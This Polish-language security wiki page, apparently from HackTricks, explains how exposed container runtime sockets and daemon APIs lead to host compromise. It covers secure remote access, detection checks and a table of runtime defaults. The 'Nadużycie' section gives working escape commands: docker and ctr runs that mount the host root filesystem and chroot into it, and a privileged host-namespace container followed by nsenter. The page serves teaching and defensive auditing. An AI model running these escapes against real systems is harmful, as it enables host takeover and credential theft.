# Runtime API i ujawnienie Daemona

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wiele rzeczywistych kompromisów kontenerów wcale nie zaczyna się od namespace escape. Zaczynają się od dostępu do runtime control plane. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podman, lub kubelet przez zamontowany Unix socket lub wystawiony TCP listener, atakujący może zażądać nowego kontenera z większymi uprawnieniami, zamontować system plików hosta, dołączyć do namespace'ów hosta lub pobrać wrażliwe informacje o nodzie. W takich przypadkach runtime API jest prawdziwą granicą bezpieczeństwa, a jego kompromitacja jest funkcjonalnie zbliżona do kompromitacji hosta.

Dlatego ujawnienie socketów runtime powinno być dokumentowane oddzielnie od zabezpieczeń jądra. Kontener z domyślnym seccomp, capabilities i MAC confinement może wciąż być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest w nim zamontowany. Izolacja jądra bieżącego kontenera może działać dokładnie tak, jak zaprojektowano, podczas gdy warstwa zarządzania runtime pozostaje w pełni ujawniona.

## Modele dostępu do daemonów

Docker Engine tradycyjnie udostępnia swój uprzywilejowany API przez lokalny Unix socket `unix:///var/run/docker.sock`. Historycznie był on także wystawiany zdalnie przez TCP listenery takie jak `tcp://0.0.0.0:2375` lub przez TLS-protected listener na porcie `2376`. Wystawienie demona zdalnie bez silnego TLS i uwierzytelniania klienta skutecznie zamienia Docker API w zdalny interfejs root.

containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o wysokim wpływie. Nazwy i workflowy się różnią, ale logika pozostaje ta sama. Jeśli interfejs pozwala wywołującemu tworzyć workloads, montować ścieżki hosta, pobierać credentials lub modyfikować działające kontenery, interfejs jest uprzywilejowanym kanałem zarządzania i powinien być traktowany odpowiednio.

Typowe lokalne ścieżki warte sprawdzenia to:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej wyspecjalizowane stosy mogą również udostępniać punkty końcowe takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale po ich napotkaniu należy traktować je z taką samą ostrożnością, ponieważ reprezentują powierzchnie kontroli środowiska wykonawczego, a nie zwykłe gniazda aplikacji.

## Bezpieczny dostęp zdalny

Jeśli daemon musi być wystawiony poza lokalne gniazdo, połączenie powinno być chronione przy użyciu TLS i najlepiej z uwierzytelnianiem wzajemnym, tak aby daemon weryfikował klienta, a klient weryfikował daemon. Dawne przyzwyczajenie otwierania Docker daemon na zwykłym HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ powierzchnia API jest wystarczająco silna, by pozwalać na bezpośrednie tworzenie uprzywilejowanych kontenerów.

Historyczny wzorzec konfiguracji Docker wyglądał następująco:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd komunikacja daemon może także pojawić się jako `fd://`, co oznacza, że proces dziedziczy wstępnie otwarty socket od systemd zamiast samodzielnie go wiązać. Ważna lekcja to nie dokładna składnia, lecz konsekwencje dla bezpieczeństwa. W momencie gdy daemon nasłuchuje poza ściśle uprawnionym lokalnym socketem, transport security i client authentication stają się obowiązkowe, a nie opcjonalne wzmocnienie.

## Nadużycie

Jeśli obecny jest runtime socket, potwierdź który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest surowy dostęp HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
### Pełny przykład: Docker Socket To Host Root

Te polecenia są przydatne, ponieważ rozróżniają nieistniejącą ścieżkę, zamontowany, lecz niedostępny socket oraz działające uprzywilejowane API. Jeśli client się powiedzie, kolejne pytanie brzmi, czy API może uruchomić nowy container z host bind mount lub host namespace sharing.

Jeśli `docker.sock` jest osiągalny, klasyczny escape polega na uruchomieniu nowego containera, który montuje host root filesystem, a następnie wykonuje `chroot` do niego:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
To zapewnia bezpośrednie wykonanie na hoście z uprawnieniami root poprzez Docker daemon. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego container atakujący może modyfikować pliki hosta, pozyskiwać poświadczenia, osadzić mechanizmy utrzymania dostępu lub uruchomić dodatkowe uprzywilejowane workloads.

### Pełny przykład: Docker Socket To Host Namespaces

Jeśli atakujący woli namespace entry zamiast filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka dociera do hosta, prosząc runtime o utworzenie nowego kontenera z jawnie wystawionym host-namespace, zamiast wykorzystywać bieżący.

### Pełny przykład: containerd Socket

Zamontowany socket `containerd` jest zwykle równie niebezpieczny:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Skutkiem ponownie jest przejęcie hosta. Nawet jeśli narzędzia specyficzne dla Docker nie są dostępne, inny runtime API może nadal zapewniać te same możliwości administracyjne.

## Checks

Celem tych kontroli jest ustalenie, czy kontener może uzyskać dostęp do jakiejkolwiek płaszczyzny zarządzania, która powinna pozostawać poza granicą zaufania.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Warto zwrócić uwagę:

- Zamontowany runtime socket zazwyczaj stanowi bezpośredni prymityw administracyjny, a nie jedynie ujawnienie informacji.
- Nasłuch TCP na `2375` bez TLS należy traktować jako warunek kompromitacji zdalnej.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z host runtime.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` listens on the local socket and the daemon is usually rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | No long-lived privileged daemon is required for ordinary local use; API sockets may still be exposed when `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API exposed through the local socket and usually consumed by higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint is intended for node-local trusted components | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet should not be broadly reachable from Pods; access may expose pod state, credentials, and execution features depending on authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
